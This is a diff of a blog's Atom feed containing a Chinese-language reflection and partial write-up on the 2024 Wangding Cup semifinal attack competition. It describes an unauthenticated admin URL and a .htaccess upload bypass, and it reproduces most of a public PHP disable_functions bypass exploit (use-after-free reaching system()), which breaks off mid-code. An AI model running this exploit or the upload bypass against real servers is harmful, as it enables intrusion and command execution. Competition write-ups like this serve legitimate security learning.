@@ -3,11 +3,11 @@
   <title>fault`s blog</title>
   
   
-  <link href="http://example.com/atom.xml" rel="self"/>
+  <link href="http://fault123.github.io/atom.xml" rel="self"/>
   
-  <link href="http://example.com/"/>
-  <updated>2024-11-26T10:13:59.749Z</updated>
-  <id>http://example.com/</id>
+  <link href="http://fault123.github.io/"/>
+  <updated>2024-11-30T14:45:55.473Z</updated>
+  <id>http://fault123.github.io/</id>
   
   <author>
     <name>fault_li</name>
@@ -18,10 +18,10 @@
   
   <entry>
     <title>2024网鼎杯半决赛复盘</title>
-    <link href="http://example.com/2024/11/26/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/"/>
-    <id>http://example.com/2024/11/26/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/</id>
+    <link href="http://fault123.github.io/2024/11/26/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/"/>
+    <id>http://fault123.github.io/2024/11/26/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/</id>
     <published>2024-11-25T16:00:00.000Z</published>
-    <updated>2024-11-26T10:13:59.749Z</updated>
+    <updated>2024-11-30T14:45:55.473Z</updated>
     
     <content type="html"><![CDATA[<blockquote><p>前排提醒，大量反思+少量wp</p></blockquote><h2 id="网鼎半决赛前"><a class="headerlink" href="#网鼎半决赛前"></a>网鼎半决赛前</h2><p>经过我一番查找和没有认真看赛制说明的情况下，我用了一周在THM上过了一遍域，并开始幻想自己轻松淦进第一层然后开始抓哈希横向的帅气操作，然后像我在云境打的很多个靶场一样，嗦！嗦！嗦！震惊队友震惊自己，我就是最酷炫的黑阔！！</p><p>带着这种思想（幻想）我在赛前一周库库刷库库开心！！</p><h2 id="网鼎半决赛"><a class="headerlink" href="#网鼎半决赛"></a>网鼎半决赛</h2><p>进场的我幸运的面基了Byx20（B神！！！）咸鱼芬（芬爹！！！）Z3m1th神！！！开心之余悄悄打植物大战僵尸（B神：你在玩什么？fault：嘻嘻 k1sme4：啊啊啊啊你怎么乱打（已红温））<br>寒暄完就是开赛辣！！！</p><p>拿到题目的一瞬间看到不是能一把嗦的站已经隐隐约约觉得哪里不对劲了（事实证明直觉没问题），但当时的我还在侥幸是不是弱口令一把嗦，只是考一点ctf一点的东西罢了，但是直到我看了一个小时没有成果的时候我害怕了</p><p>fault对于爆零的心理阴影由来已久，早些追溯到大一的ISCTF，晚些追溯到CCB半决，那时候的我又菜（虽然现在也好不到哪儿去）又颓废，但多半取决于我在刷了一年web题仍然在大一的比赛中被薄纱让我看不到希望，像我这种人是最看重短期成效的，如果没有短期成效就开始怀疑自己的烂天赋，怀疑自己到底有没有脑子。反复的内耗+校内一团乱麻+家中出事，根本没有心思学习，导致我大二拖累了k1没有去CCB决赛，之后这成了氤氲在我大脑中无数噩梦轮回的阴影，每次比赛我都在担心他会不会不让我去打，但我又怕他和我组队但我又拖累他一次）</p><p>没错，在看到题目并不如自己赛前愿景的fault开始难受+胡思乱想。但是我。。。</p><p>我的灵感！<br>在长达一年脑雾后我的灵感回来了！</p><p>我开始审计这个站（恒汇）</p><p>发现了亲爱的未授权和自己的一些理解结合起来</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://114.114.114.199/index.php?mod=admin&amp;act=shop&amp;get=goods&amp;re=list</span><br></pre></td></tr></table></figure><p>于是我发现了这个<br>这个本质是在js中翻到的shop但是经过我个人对站的理解后发现这个地方有一个未授权！！！<br>然后进去之后发现有一个文件上传的地方<br>发现传不了php&amp;&amp;phtml<br>但是又有哪一次是能传的呢？<br>于是继续测试，发现.htaccess可以传上去的一瞬间！<br>我头皮发麻，那一瞬间我觉得<br>我，我真的可以<br>然后一遍传jpg一遍拍k1sme4，他探头，我给他看我.htaccess传上去了<br>他：！<br>我：！<br>刚睡醒的赵总：！<br>然后我光速访问，发现emmmm，我勒个权限低到爆<br>于是再写一个phpinfo，果然，是因为disable_function<br>尝试用这个脚本搞掉，但是没成功</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># PHP 7.0-8.0 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Bug: https://bugs.php.net/bug.php?id=54350</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-8.0 versions</span></span><br><span class="line"><span class="comment"># released as of 2021-10-06</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&#x27;uname -a&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;LOGGING&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;CHUNK_DATA_SIZE&#x27;</span>, <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;CHUNK_SIZE&#x27;</span>, ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE + <span class="number">0x20</span> : CHUNK_DATA_SIZE);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;FILTER_SIZE&#x27;</span>, ZEND_DEBUG_BUILD ? <span class="number">0x70</span> : <span class="number">0x50</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;STRING_SIZE&#x27;</span>, CHUNK_DATA_SIZE - <span class="number">0x18</span> - <span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;CMD&#x27;</span>, <span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$groom</span>[] = <span class="title class_">Pwn</span>::<span class="title function_ invoke__">alloc</span>(STRING_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_register</span>(<span class="string">&#x27;pwn_filter&#x27;</span>, <span class="string">&#x27;Pwn&#x27;</span>);</span><br><span class="line">    <span class="variable">$fd</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://memory&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fd</span>,<span class="string">&#x27;pwn_filter&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fd</span>, <span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span> <span class="keyword">extends</span> <span class="title">php_user_filter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$abc</span>, <span class="variable">$abc_addr</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$helper</span>, <span class="variable">$helper_addr</span>, <span class="variable">$helper_off</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$uafp</span>, <span class="variable">$hfp</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$in</span>, <span class="variable">$out</span>, &amp;<span class="variable">$consumed</span>, <span class="variable">$closing</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$closing</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="title function_ invoke__">stream_bucket_make_writeable</span>(<span class="variable">$in</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filtername = <span class="title class_">Pwn</span>::<span class="title function_ invoke__">alloc</span>(STRING_SIZE);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$this</span>-&gt;stream);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">go</span>();</span><br><span class="line">        <span class="keyword">return</span> PSFS_PASS_ON;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">go</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;abc = &amp;<span class="variable language_">$this</span>-&gt;filtername;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">make_uaf_obj</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;helper = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;helper-&gt;b = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$x</span></span>) </span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;helper_addr = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(CHUNK_SIZE * <span class="number">2</span> - <span class="number">0x18</span>) - CHUNK_SIZE * <span class="number">2</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;helper @ 0x%x&quot;</span>, <span class="variable">$this</span>-&gt;helper_addr);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;abc_addr = <span class="variable language_">$this</span>-&gt;helper_addr - CHUNK_SIZE;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;abc @ 0x%x&quot;</span>, <span class="variable">$this</span>-&gt;abc_addr);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;helper_off = <span class="variable language_">$this</span>-&gt;helper_addr - <span class="variable language_">$this</span>-&gt;abc_addr - <span class="number">0x18</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$helper_handlers</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(CHUNK_SIZE);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;helper handlers @ 0x%x&quot;</span>, <span class="variable">$helper_handlers</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">prepare_leaker</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$binary_leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$helper_handlers</span> + <span class="number">8</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;binary leak @ 0x%x&quot;</span>, <span class="variable">$binary_leak</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">prepare_cleanup</span>(<span class="variable">$binary_leak</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$closure_addr</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;helper_off + <span class="number">0x38</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;real closure @ 0x%x&quot;</span>, <span class="variable">$closure_addr</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$closure_ce</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$closure_addr</span> + <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;closure class_entry @ 0x%x&quot;</span>, <span class="variable">$closure_ce</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$basic_funcs</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$closure_ce</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;basic_functions @ 0x%x&quot;</span>, <span class="variable">$basic_funcs</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$zif_system</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;zif_system @ 0x%x&quot;</span>, <span class="variable">$zif_system</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$fake_closure_off</span> = <span class="variable language_">$this</span>-&gt;helper_off + CHUNK_SIZE * <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x138</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$fake_closure_off</span> + <span class="variable">$i</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$closure_addr</span> + <span class="variable">$i</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$fake_closure_off</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$handler_offset</span> = PHP_MAJOR_VERSION === <span class="number">8</span> ? <span class="number">0x70</span> : <span class="number">0x68</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$fake_closure_off</span> + <span class="variable">$handler_offset</span>, <span class="variable">$zif_system</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$fake_closure_addr</span> = <span class="variable language_">$this</span>-&gt;helper_addr + <span class="variable">$fake_closure_off</span> - <span class="variable language_">$this</span>-&gt;helper_off;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;helper_off + <span class="number">0x38</span>, <span class="variable">$fake_closure_addr</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;fake closure @ 0x%x&quot;</span>, <span class="variable">$fake_closure_addr</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">cleanup</span>();</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;helper-&gt;b)(CMD);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">make_uaf_obj</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;uafp = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://memory&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;uafp, <span class="title function_ invoke__">pack</span>(<span class="string">&#x27;QQQ&#x27;</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0xDEADBAADC0DE</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; STRING_SIZE; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;uafp, <span class="string">&quot;\x00&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">prepare_leaker</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$str_off</span> = <span class="variable language_">$this</span>-&gt;helper_off + CHUNK_SIZE + <span class="number">8</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$str_off</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$str_off</span> + <span class="number">0x10</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$val_off</span> = <span class="variable language_">$this</span>-&gt;helper_off + <span class="number">0x48</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$val_off</span>, <span class="variable">$this</span>-&gt;helper_addr + CHUNK_SIZE + <span class="number">8</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$val_off</span> + <span class="number">8</span>, <span class="number">0xA</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">prepare_cleanup</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$ret_gadget</span> = <span class="variable">$binary_leak</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            --<span class="variable">$ret_gadget</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$ret_gadget</span>, <span class="number">1</span>) !== <span class="number">0xC3</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;ret gadget = 0x%x&quot;</span>, <span class="variable">$ret_gadget</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="number">0</span>, <span class="variable">$this</span>-&gt;abc_addr + <span class="number">0x20</span> - (PHP_MAJOR_VERSION === <span class="number">8</span> ? <span class="number">0x50</span> : <span class="number">0x60</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="number">8</span>, <span class="variable">$ret_gadget</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;helper_off + CHUNK_SIZE + <span class="number">16</span>, <span class="variable">$addr</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$value</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;helper-&gt;c);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$n</span> !== <span class="number">8</span>) &#123; <span class="variable">$value</span> &amp;= (<span class="number">1</span> &lt;&lt; (<span class="variable">$n</span> &lt;&lt; <span class="number">3</span>)) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;abc[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$addr</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="comment">// In rare instances the standard module might lie after the addr we&#x27;re starting</span></span><br><span class="line">            <span class="comment">// the search from. This will result in a SIGSGV when the search reaches an unmapped page.</span></span><br><span class="line">            <span class="comment">// In that case, changing the direction of the search should fix the crash.</span></span><br><span class="line">            <span class="comment">// $addr += 0x10;</span></span><br><span class="line">            <span class="variable">$addr</span> -= <span class="number">0x10</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span>, <span class="number">4</span>) === <span class="number">0xA8</span> &amp;&amp;</span><br><span class="line">                <span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span> + <span class="number">4</span>, <span class="number">4</span>),</span><br><span class="line">                    [<span class="number">20151012</span>, <span class="number">20160303</span>, <span class="number">20170718</span>, <span class="number">20180731</span>, <span class="number">20190902</span>, <span class="number">20200930</span>])) &#123;</span><br><span class="line">                <span class="variable">$module_name_addr</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span> + <span class="number">0x20</span>);</span><br><span class="line">                <span class="variable">$module_name</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$module_name_addr</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$module_name</span> === <span class="number">0x647261646e617473</span>) &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;standard module @ 0x%x&quot;</span>, <span class="variable">$addr</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span> + <span class="number">0x28</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$f_entry</span>, <span class="number">6</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> === <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> !== <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hfp = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://memory&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;hfp, <span class="title function_ invoke__">pack</span>(<span class="string">&#x27;QQ&#x27;</span>, <span class="number">0</span>, <span class="variable">$this</span>-&gt;abc_addr));</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; FILTER_SIZE - <span class="number">0x10</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;hfp, <span class="string">&quot;\x00&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span 